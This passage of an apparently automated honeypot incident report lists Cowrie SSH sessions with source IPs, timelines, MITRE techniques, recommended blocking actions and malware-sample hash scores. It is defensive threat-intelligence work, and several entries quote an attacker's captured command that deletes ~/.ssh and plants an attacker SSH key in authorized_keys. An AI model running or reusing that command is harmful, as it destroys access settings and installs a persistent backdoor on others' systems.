| **Last Seen** | 2026-07-06 18:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:40:00` | `cowrie.session.connect` |
| `2026-07-06 18:40:00` | `cowrie.client.version` |
| `2026-07-06 18:40:00` | `cowrie.client.kex` |
| `2026-07-06 18:40:01` | `cowrie.login.success` |
| `2026-07-06 18:40:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.147.162[.]215` to AbuseIPDB if not already reported
- [ ] Block `186.147.162[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d135461f264d

| Field | Detail |
|---|---|
| **Source IP** | `186.147.162[.]215` |
| **First Seen** | 2026-07-06 18:40 |
| **Last Seen** | 2026-07-06 18:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:40:01` | `cowrie.session.connect` |
| `2026-07-06 18:40:01` | `cowrie.client.version` |
| `2026-07-06 18:40:01` | `cowrie.client.kex` |
| `2026-07-06 18:40:01` | `cowrie.login.success` |
| `2026-07-06 18:40:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.147.162[.]215` to AbuseIPDB if not already reported
- [ ] Block `186.147.162[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ae3a2ec5041

| Field | Detail |
|---|---|
| **Source IP** | `144.31.156[.]154` |
| **First Seen** | 2026-07-06 18:40 |
| **Last Seen** | 2026-07-06 18:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:40:17` | `cowrie.session.connect` |
| `2026-07-06 18:40:17` | `cowrie.client.version` |
| `2026-07-06 18:40:17` | `cowrie.client.kex` |
| `2026-07-06 18:40:18` | `cowrie.login.success` |
| `2026-07-06 18:40:19` | `cowrie.session.params` |
| `2026-07-06 18:40:19` | `cowrie.command.input` |
| `2026-07-06 18:40:19` | `cowrie.command.failed` |
| `2026-07-06 18:40:20` | `cowrie.log.closed` |
| `2026-07-06 18:40:20` | `cowrie.session.params` |
| `2026-07-06 18:40:20` | `cowrie.command.input` |
| `2026-07-06 18:40:21` | `cowrie.session.file_download` |
| `2026-07-06 18:40:21` | `cowrie.log.closed` |
| `2026-07-06 18:40:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.31.156[.]154` to AbuseIPDB if not already reported
- [ ] Block `144.31.156[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18236323f0c4

| Field | Detail |
|---|---|
| **Source IP** | `144.31.156[.]154` |
| **First Seen** | 2026-07-06 18:40 |
| **Last Seen** | 2026-07-06 18:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:40:21` | `cowrie.session.connect` |
| `2026-07-06 18:40:21` | `cowrie.client.version` |
| `2026-07-06 18:40:21` | `cowrie.client.kex` |
| `2026-07-06 18:40:22` | `cowrie.login.success` |
| `2026-07-06 18:40:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.31.156[.]154` to AbuseIPDB if not already reported
- [ ] Block `144.31.156[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f4399254cd5

| Field | Detail |
|---|---|
| **Source IP** | `144.31.156[.]154` |
| **First Seen** | 2026-07-06 18:40 |
| **Last Seen** | 2026-07-06 18:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:40:22` | `cowrie.session.connect` |
| `2026-07-06 18:40:22` | `cowrie.client.version` |
| `2026-07-06 18:40:22` | `cowrie.client.kex` |
| `2026-07-06 18:40:23` | `cowrie.login.success` |
| `2026-07-06 18:40:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.31.156[.]154` to AbuseIPDB if not already reported
- [ ] Block `144.31.156[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13234451344a

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-07-06 18:46 |
| **Last Seen** | 2026-07-06 18:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:46:44` | `cowrie.session.connect` |
| `2026-07-06 18:46:44` | `cowrie.client.version` |
| `2026-07-06 18:46:44` | `cowrie.client.kex` |
| `2026-07-06 18:46:45` | `cowrie.login.success` |
| `2026-07-06 18:46:46` | `cowrie.session.params` |
| `2026-07-06 18:46:46` | `cowrie.command.input` |
| `2026-07-06 18:46:46` | `cowrie.command.failed` |
| `2026-07-06 18:46:46` | `cowrie.log.closed` |
| `2026-07-06 18:46:47` | `cowrie.session.params` |
| `2026-07-06 18:46:47` | `cowrie.command.input` |
| `2026-07-06 18:46:47` | `cowrie.session.file_download` |
| `2026-07-06 18:46:47` | `cowrie.log.closed` |
| `2026-07-06 18:46:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22c2cf1b4186

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-07-06 18:46 |
| **Last Seen** | 2026-07-06 18:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:46:48` | `cowrie.session.connect` |
| `2026-07-06 18:46:48` | `cowrie.client.version` |
| `2026-07-06 18:46:48` | `cowrie.client.kex` |
| `2026-07-06 18:46:49` | `cowrie.login.success` |
| `2026-07-06 18:46:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34dd2147bc37

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-07-06 18:46 |
| **Last Seen** | 2026-07-06 18:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:46:49` | `cowrie.session.connect` |
| `2026-07-06 18:46:49` | `cowrie.client.version` |
| `2026-07-06 18:46:50` | `cowrie.client.kex` |
| `2026-07-06 18:46:51` | `cowrie.login.success` |
| `2026-07-06 18:46:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7f5c69ced3c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 18:47 |
| **Last Seen** | 2026-07-06 18:47 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:47:42` | `cowrie.session.connect` |
| `2026-07-06 18:47:44` | `cowrie.client.version` |
| `2026-07-06 18:47:44` | `cowrie.client.kex` |
| `2026-07-06 18:47:50` | `cowrie.login.success` |
| `2026-07-06 18:47:54` | `cowrie.session.params` |
| `2026-07-06 18:47:54` | `cowrie.command.input` |
| `2026-07-06 18:47:56` | `cowrie.log.closed` |
| `2026-07-06 18:47:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cc2d0b2cbd6

| Field | Detail |
|---|---|
| **Source IP** | `71.27.86[.]44` |
| **First Seen** | 2026-07-06 18:50 |
| **Last Seen** | 2026-07-06 18:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:50:19` | `cowrie.session.connect` |
| `2026-07-06 18:50:19` | `cowrie.client.version` |
| `2026-07-06 18:50:19` | `cowrie.client.kex` |
| `2026-07-06 18:50:19` | `cowrie.login.success` |
| `2026-07-06 18:50:20` | `cowrie.session.params` |
| `2026-07-06 18:50:20` | `cowrie.command.input` |
| `2026-07-06 18:50:20` | `cowrie.command.failed` |
| `2026-07-06 18:50:20` | `cowrie.log.closed` |
| `2026-07-06 18:50:20` | `cowrie.session.params` |
| `2026-07-06 18:50:20` | `cowrie.command.input` |
| `2026-07-06 18:50:20` | `cowrie.session.file_download` |
| `2026-07-06 18:50:20` | `cowrie.log.closed` |
| `2026-07-06 18:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.27.86[.]44` to AbuseIPDB if not already reported
- [ ] Block `71.27.86[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b50dc71c2a8

| Field | Detail |
|---|---|
| **Source IP** | `71.27.86[.]44` |
| **First Seen** | 2026-07-06 18:50 |
| **Last Seen** | 2026-07-06 18:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:50:20` | `cowrie.session.connect` |
| `2026-07-06 18:50:20` | `cowrie.client.version` |
| `2026-07-06 18:50:20` | `cowrie.client.kex` |
| `2026-07-06 18:50:21` | `cowrie.login.success` |
| `2026-07-06 18:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.27.86[.]44` to AbuseIPDB if not already reported
- [ ] Block `71.27.86[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-926859db4563

| Field | Detail |
|---|---|
| **Source IP** | `71.27.86[.]44` |
| **First Seen** | 2026-07-06 18:50 |
| **Last Seen** | 2026-07-06 18:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:50:21` | `cowrie.session.connect` |
| `2026-07-06 18:50:21` | `cowrie.client.version` |
| `2026-07-06 18:50:21` | `cowrie.client.kex` |
| `2026-07-06 18:50:21` | `cowrie.login.success` |
| `2026-07-06 18:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.27.86[.]44` to AbuseIPDB if not already reported
- [ ] Block `71.27.86[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14489823cdcb

| Field | Detail |
|---|---|
| **Source IP** | `165.154.254[.]143` |
| **First Seen** | 2026-07-06 18:52 |
| **Last Seen** | 2026-07-06 18:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:52:54` | `cowrie.session.connect` |
| `2026-07-06 18:52:54` | `cowrie.client.version` |
| `2026-07-06 18:52:54` | `cowrie.client.kex` |
| `2026-07-06 18:52:54` | `cowrie.login.success` |
| `2026-07-06 18:52:55` | `cowrie.session.params` |
| `2026-07-06 18:52:55` | `cowrie.command.input` |
| `2026-07-06 18:52:55` | `cowrie.command.failed` |
| `2026-07-06 18:52:55` | `cowrie.log.closed` |
| `2026-07-06 18:52:56` | `cowrie.session.params` |
| `2026-07-06 18:52:56` | `cowrie.command.input` |
| `2026-07-06 18:52:56` | `cowrie.session.file_download` |
| `2026-07-06 18:52:56` | `cowrie.log.closed` |
| `2026-07-06 18:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.254[.]143` to AbuseIPDB if not already reported
- [ ] Block `165.154.254[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-233ee5b40d27

| Field | Detail |
|---|---|
| **Source IP** | `165.154.254[.]143` |
| **First Seen** | 2026-07-06 18:52 |
| **Last Seen** | 2026-07-06 18:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:52:56` | `cowrie.session.connect` |
| `2026-07-06 18:52:56` | `cowrie.client.version` |
| `2026-07-06 18:52:56` | `cowrie.client.kex` |
| `2026-07-06 18:52:56` | `cowrie.login.success` |
| `2026-07-06 18:52:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.254[.]143` to AbuseIPDB if not already reported
- [ ] Block `165.154.254[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e4a8a061e28

| Field | Detail |
|---|---|
| **Source IP** | `165.154.254[.]143` |
| **First Seen** | 2026-07-06 18:52 |
| **Last Seen** | 2026-07-06 18:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 18:52:56` | `cowrie.session.connect` |
| `2026-07-06 18:52:56` | `cowrie.client.version` |
| `2026-07-06 18:52:56` | `cowrie.client.kex` |
| `2026-07-06 18:52:57` | `cowrie.login.success` |
| `2026-07-06 18:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.254[.]143` to AbuseIPDB if not already reported
- [ ] Block `165.154.254[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.61.192[.]156` | **145** | 2026-07-06 14:55 | 2026-07-06 18:54 | 165m | 0 | `T1592` | 🟠 MEDIUM |
| `206.81.2[.]201` | **27** | 2026-07-06 14:55 | 2026-07-06 18:53 | 15m | 0 | `T1592` | 🟠 MEDIUM |
| `164.92.115[.]22` | **20** | 2026-07-06 15:12 | 2026-07-06 18:02 | 16m | 0 | `T1592` | 🟠 MEDIUM |
| `46.101.229[.]179` | **10** | 2026-07-06 17:57 | 2026-07-06 17:58 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-07-06 15:09 | 2026-07-06 18:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.204.138[.]198` | **7** | 2026-07-06 14:55 | 2026-07-06 15:33 | 3m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]80` | **5** | 2026-07-06 16:34 | 2026-07-06 16:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **3** | 2026-07-06 16:02 | 2026-07-06 16:09 | 3m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]217` | **3** | 2026-07-06 17:22 | 2026-07-06 17:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.96.202[.]189` | **2** | 2026-07-06 15:32 | 2026-07-06 15:34 | 2m | 0 | `T1592` | 🟢 LOW |
| `118.252.27[.]84` | **2** | 2026-07-06 18:34 | 2026-07-06 18:36 | 2m | 0 | `T1592` | 🟢 LOW |
| `185.180.141[.]52` | **2** | 2026-07-06 16:42 | 2026-07-06 16:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.163.37[.]97` | **2** | 2026-07-06 17:18 | 2026-07-06 17:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `218.203.203[.]232` | **2** | 2026-07-06 17:53 | 2026-07-06 17:55 | 2m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]132` | **2** | 2026-07-06 17:38 | 2026-07-06 17:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `117.187.180[.]162` | 1 | 2026-07-06 16:21 | 2026-07-06 16:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.229.191[.]90` | 1 | 2026-07-06 18:44 | 2026-07-06 18:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]116` | 1 | 2026-07-06 18:13 | 2026-07-06 18:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.64[.]39` | 1 | 2026-07-06 16:23 | 2026-07-06 16:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | 1 | 2026-07-06 18:31 | 2026-07-06 18:32 | 84s | 0 | `T1592` | 🟢 LOW |
| `185.180.141[.]54` | 1 | 2026-07-06 16:42 | 2026-07-06 16:42 | 5s | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]167` | 1 | 2026-07-06 15:58 | 2026-07-06 15:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.58.172[.]185` | 1 | 2026-07-06 15:04 | 2026-07-06 15:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.58.172[.]185` | 1 | 2026-07-06 17:31 | 2026-07-06 17:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | 1 | 2026-07-06 15:46 | 2026-07-06 15:47 | 55s | 0 | `T1592` | 🟢 LOW |
| `221.226.17[.]34` | 1 | 2026-07-06 16:16 | 2026-07-06 16:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-07-06 15:33 | 2026-07-06 15:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.240.236[.]116` | 1 | 2026-07-06 15:24 | 2026-07-06 15:25 | 10s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-06 16:02 | 2026-07-06 16:03 | 35s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]27` | 1 | 2026-07-06 15:04 | 2026-07-06 15:04 | 7s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]19` | 1 | 2026-07-06 17:20 | 2026-07-06 17:20 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]28` | 1 | 2026-07-06 17:17 | 2026-07-06 17:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]31` | 1 | 2026-07-06 17:17 | 2026-07-06 17:17 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]176` | 1 | 2026-07-06 16:14 | 2026-07-06 16:14 | 7s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **38/74** 🔴 |
